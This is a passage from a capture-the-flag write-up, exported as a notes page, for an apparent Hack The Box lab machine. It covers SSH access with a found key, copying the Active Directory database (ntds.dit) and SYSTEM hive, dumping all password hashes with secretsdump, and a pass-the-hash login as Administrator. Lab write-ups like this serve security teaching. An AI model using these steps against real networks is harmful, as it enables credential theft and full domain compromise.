class="h3" id="20250706205901-knm1lv9" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 6: The Heist (Stealing the AD Database)</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-skjww04" data-type="NodeParagraph" class="p" id="20250706205901-skjww04" updated="20250706205901"><div contenteditable="false" spellcheck="false">Remember that weird SSH port (2222) from the beginning? This was where it came into play. We used the <span data-type="code">id_rsa</span>​ key to log in as <span data-type="code">svc_backup</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-wottucv" data-type="NodeCodeBlock" class="code-block" id="20250706205901-wottucv" updated="20250706205901"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">bash</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">ssh svc_backup@voleur.htb -p 2222 -i id_rsa
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-ve0qnr2" data-type="NodeParagraph" class="p" id="20250706205901-ve0qnr2" updated="20250706205901"><div contenteditable="false" spellcheck="false">This dropped us into a Linux shell running on the Windows machine (thanks, WSL!). And as a backup user, we had permission to read the backup folders.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-9vi3c81" data-type="NodeParagraph" class="p" updated="20250706205901" id="20250706205901-9vi3c81"><div contenteditable="false" spellcheck="false">From there, we grabbed the holy grail of any Active Directory pentest:</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="o" data-node-id="20250706205901-9exbmut" data-type="NodeList" class="list" id="20250706205901-9exbmut" updated="20250706205901"><div data-marker="1." data-subtype="o" data-node-id="20250706205901-b5p2yh0" data-type="NodeListItem" class="li" id="20250706205901-b5p2yh0" updated="20250706205901"><div class="protyle-action protyle-action--order" contenteditable="false" draggable="true">1.</div><div data-node-id="20250706205901-lah1q48" data-type="NodeParagraph" class="p" id="20250706205901-lah1q48" updated="20250706205901"><div contenteditable="false" spellcheck="false">The entire user database (<span data-type="code">ntds.dit</span>​)</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-marker="2." data-subtype="o" data-node-id="20250706205901-gth1v95" data-type="NodeListItem" class="li" id="20250706205901-gth1v95" updated="20250706205901"><div class="protyle-action protyle-action--order" contenteditable="false" draggable="true">2.</div><div data-node-id="20250706205901-1ridohi" data-type="NodeParagraph" class="p" id="20250706205901-1ridohi" updated="20250706205901"><div contenteditable="false" spellcheck="false">The <span data-type="code">SYSTEM</span>​ registry hive (which acts as the key to unlock the database)</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-9tn69fp" data-type="NodeParagraph" class="p" id="20250706205901-9tn69fp" updated="20250706205901"><div contenteditable="false" spellcheck="false">We <span data-type="code">scp</span>​'d both files right off the server and onto our own machine.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205901-my7z7cb" data-type="NodeHeading" class="h3" id="20250706205901-my7z7cb" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 7: Game Over - Becoming Domain Admin</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-roks4ek" data-type="NodeParagraph" class="p" id="20250706205901-roks4ek" updated="20250706205901"><div contenteditable="false" spellcheck="false">Once you have the <span data-type="code">ntds.dit</span>​ and <span data-type="code">SYSTEM</span>​ files offline, it's effectively game over.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-vcrltzu" data-type="NodeParagraph" class="p" updated="20250706205901" id="20250706205901-vcrltzu"><div contenteditable="false" spellcheck="false">We used <span data-type="code">impacket-secretsdump.py</span>​ to crack open that database. It instantly dumped the password hashes for <span data-type="strong">every single user</span> in the domain, including the <span data-type="code">Administrator</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-nygzhem" data-type="NodeCodeBlock" class="code-block" id="20250706205901-nygzhem" updated="20250706205901"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">bash</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-w8kpfvs" data-type="NodeParagraph" class="p" updated="20250706205901" id="20250706205901-w8kpfvs"><div contenteditable="false" spellcheck="false">We didn't even need to crack the Administrator's hash. We just used the hash itself to authenticate in a &quot;Pass-the-Hash&quot; attack. We got an Administrator Kerberos ticket and then used <span data-type="code">evil-winrm</span>​ one last time.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-8a42o8x" data-type="NodeParagraph" class="p" id="20250706205901-8a42o8x" updated="20250706205901"><div contenteditable="false" spellcheck="false">This time, we logged in as the <span data-type="code">Administrator</span>​. We navigated to the desktop, read the <span data-type="code">root.txt</span>​ file, and owned the entire domain.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-jkqh4ep" data-type="NodeParagraph" class="p" id="20250706205901-jkqh4ep" updated="20250706205901"><div contenteditable="false" spellcheck="false">And that's how it's done. A classic chain of misconfigurations and weak passwords leading from a low-level user all the way to complete domain compromise.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205648-h6x49a6" data-type="NodeParagraph" class="p" id="20250706205648-h6x49a6" updated="20250706205648"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div></div>
<script src="appearance/icons/material/icon.js?v=3.1.32"></script>
<script src="stage/build/export/protyle-method.js?v=3.1.32"></script>
<script src="stage/protyle/js/lute/lute.min.js?v=3.1.32"></script>  
<script>
    window.siyuan = {
      config: {
        appearance: { mode: 1, codeBlockThemeDark: "base16/dracula", codeBlockThemeLight: "github" },
        editor: { 
          codeLineWrap: true,
          fontSize: 16,
          codeLigatures: false,
          plantUMLServePath: "https://www.plantuml.com/plantuml/svg/~1",
          codeSyntaxHighlightLineNum: false,
          katexMacros: JSON.stringify({}),
        }
      },
      languages: {copy:"Copy"}
    };
    const previewElement = document.getElementById('preview');
    Protyle.highlightRender(previewElement, "stage/protyle");
    Protyle.mathRender(previewElement, "stage/protyle", false);
    Protyle.mermaidRender(previewElement, "stage/protyle");
    Protyle.flowchartRender(previewElement, "stage/protyle");
    Protyle.graphvizRender(previewElement, "stage/protyle");
    Protyle.chartRender(previewElement, "stage/protyle");
    Protyle.mindmapRender(previewElement, "stage/protyle");
    Protyle.abcRender(previewElement, "stage/protyle");
    Protyle.htmlRender(previewElement);
    Protyle.plantumlRender(previewElement, "stage/protyle");
    document.querySelectorAll(".protyle-action__copy").forEach((item) => {
      item.addEventListener("click", (event) => {
            let text = item.parentElement.nextElementSibling.textContent.trimEnd();
            text = text.replace(/ /g, " "); // Replace non-breaking spaces with normal spaces when copying
            navigator.clipboard.writeText(text);
            event.preventDefault();
            event.stopPropagation();
      })
    });
</script></body></html>
